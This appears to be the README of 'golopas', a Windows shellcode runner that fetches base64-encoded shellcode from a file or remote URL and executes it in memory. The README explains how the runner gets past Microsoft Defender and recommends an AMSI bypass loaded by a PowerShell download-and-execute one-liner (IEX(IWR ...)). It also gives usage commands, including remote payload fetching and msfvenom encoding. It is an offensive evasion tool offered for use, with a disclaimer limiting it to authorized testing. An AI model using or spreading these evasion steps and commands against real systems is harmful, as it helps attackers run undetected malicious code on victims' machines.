# golopas

A minimal Windows shellcode runner that fetches, decodes, and executes shellcode in memory.

> ⚠️ **Disclaimer** — For authorized penetration testing and security research only. You are responsible for complying with the laws where you use this. Use at your own risk.

## How it works

Takes base64-encoded shellcode from a local file or remote URL, decodes it, allocates RWX memory with `VirtualAlloc`, copies the shellcode in with `RtlMoveMemory`, and runs it via `CreateThread`.

## Defender evasion (as of 2025)

This was enough to get past Microsoft Defender's on-disk scanning as of the source walkthrough in 2025, for a few reasons:

- **No raw shellcode on disk.** Defender's strongest layer is static signature scanning. The shellcode itself (e.g. an msfvenom payload) is heavily signatured, but here it only ever exists base64-encoded on disk, or not at all when pulled with `-remote`. The runner's binary contains nothing malicious — just normal Go code — until the shellcode arrives at runtime, is decoded in memory, and jumps straight to execution.
- **No suspicious child process.** The shellcode runs in its own thread inside the same process via `CreateThread`, instead of spawning `cmd.exe`/`powershell.exe` or injecting into another process — the patterns Defender's behavioral monitoring watches most closely.
- **Standard APIs only.** `VirtualAlloc` → `RtlMoveMemory` → `CreateThread` is the classic local-execution chain and doesn't (yet) trip Defender the way process-injection APIs do.

### Honest limits

This is entry-level evasion, not a guaranteed bypass:

- **Defender's memory scanning** (signature-based scan of memory, added around 2022) can still flag well-known payloads once they're decoded in RWX memory. Fresher or custom shellcode fares better than stock msfvenom output.
- **No unhooking, no AMSI patching, no encryption.** If your shellcode itself triggers AMSI or carries a known signature, this won't save it.
- **EDR is a different story.** Sentinel One, CrowdStrike, etc. watch RWX allocation + thread creation combos via ETW and will likely catch this.
- **The `-remote` URL is visible** in network logs (plain HTTP GET), which defenders can flag.

### Recommended: AMSI bypass first

AMSI patching is **per-process**, so a patch only protects the process it's applied in. [AMSIBypassPatch](https://github.com/okankurtuluss/AMSIBypassPatch) hooks the `AmsiScanBuffer` path so payloads in the patched process stop being flagged by AMSI. The recommended way is to pull and patch straight into your PowerShell session before anything else runs:

```powershell
IEX(IWR -UseBasicParsing http://YOUR_HTTP_SERVER/amsi_patch.ps1)
```

- Apply this **in the PowerShell session where you stage payloads** (e.g. `IEX`/`Invoke-` style) — patches only that process.
- golopas is a native Go exe — it runs shellcode in its own process and doesn't strictly need the patch for that.
- Shellcode that spawns a **new** PowerShell process gets a fresh, unpatched AMSI — patch there too.

Treat it as a learning tool for how static evasion works, and re-test against your target's actual stack before relying on it.

## Usage

```powershell
golopas.exe -local C:\path\to\shellcode.enc
golopas.exe -remote http://host/shellcode.enc
```

`-local` — path to a base64 shellcode file. `-remote` — URL to fetch it from. One is required.

Encode your shellcode first, e.g.:

```bash
msfvenom -p windows/x64/exec CMD=calc.exe -f raw | base64 > shellcode.enc
```

## Build

Cross-compile from any machine with Go 1.27+:

```bash
GOOS=windows GOARCH=amd64 go build -o golopas.exe
```

## Release

To cut a release (tags the repo, builds `golopas-<version>.exe`, and publishes it with `gh` if installed):

```bash
./release.sh 1.0.0
```

## Credits

Technique based on [this walkthrough](https://www.youtube.com/watch?v=MRNwrvfq_G0&t=32s).

## Author

**Phyo Zin Khant** — hello@phyozinkhant.dev

## License

MIT — see [LICENSE](LICENSE).
